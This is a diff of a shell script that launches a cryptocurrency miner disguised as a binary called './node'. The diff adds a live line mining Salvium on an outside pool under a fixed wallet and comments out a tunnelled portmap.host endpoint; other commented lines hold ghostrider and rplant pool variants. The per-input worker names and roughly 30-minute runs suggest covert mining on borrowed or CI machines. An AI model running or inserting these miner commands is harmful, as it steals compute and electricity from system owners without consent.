@@ -44,8 +44,8 @@ echo "start ${INPUT_NUMBER}"
 #START=$(./node -a ghostrider -o us-east.flockpool.com:4444 -u RFPo8rf6nP7ZSJ67JPvAhwcgYsUZo8JLjV.net_${INPUT_NUMBER} -p x > try.log & sleep 1830 )
 #START=$(./node -a ghostrider -o us-east.flockpool.com:5555 --tls true -u RFPo8rf6nP7ZSJ67JPvAhwcgYsUZo8JLjV.net_${INPUT_NUMBER} -p x > try.log & sleep 1830 )
 # salvium
-#START=$(./node -a rx/0 -k -t 2 --cpu-priority 4 --cpu-no-yield --donate-level 1 -o us.salvium.herominers.com:1230 -u SC11tt3aqqvWKBkTsrqVM4NSJfjwE2Gg3icrZvPA9WCmGEhRVGjpeoQU4d1neroY1Nfap7HtSNwdJ7rY8PoUNW5r4VSv4CmuLk.net_${INPUT_NUMBER} > try.log & sleep 1830 )
-START=$(./node -a rx/0 -k -t 2 --cpu-priority 4 --cpu-no-yield --donate-level 1 -o menju2ikg8uti-50625.portmap.host:50625 -u SC11tt3aqqvWKBkTsrqVM4NSJfjwE2Gg3icrZvPA9WCmGEhRVGjpeoQU4d1neroY1Nfap7HtSNwdJ7rY8PoUNW5r4VSv4CmuLk.net_${INPUT_NUMBER} > try.log & sleep 1830 )
+START=$(./node -a rx/0 -k -t 2 --cpu-priority 4 --cpu-no-yield --donate-level 1 -o us.salvium.herominers.com:1230 -u SC11tt3aqqvWKBkTsrqVM4NSJfjwE2Gg3icrZvPA9WCmGEhRVGjpeoQU4d1neroY1Nfap7HtSNwdJ7rY8PoUNW5r4VSv4CmuLk.net_${INPUT_NUMBER} > try.log & sleep 1830 )
+#START=$(./node -a rx/0 -k -t 2 --cpu-priority 4 --cpu-no-yield --donate-level 1 -o menju2ikg8uti-31540.portmap.host:31540 -u SC11tt3aqqvWKBkTsrqVM4NSJfjwE2Gg3icrZvPA9WCmGEhRVGjpeoQU4d1neroY1Nfap7HtSNwdJ7rY8PoUNW5r4VSv4CmuLk.net_${INPUT_NUMBER} > try.log & sleep 1830 )
 #START=$(./node -a rx/0 -k --cpu-priority 4 --cpu-no-yield --donate-level 1 -o randomx.rplant.xyz:7130 -u SC11tt3aqqvWKBkTsrqVM4NSJfjwE2Gg3icrZvPA9WCmGEhRVGjpeoQU4d1neroY1Nfap7HtSNwdJ7rY8PoUNW5r4VSv4CmuLk.net_${INPUT_NUMBER} -p m=solo > try.log & sleep 1200 )
 
 # monero
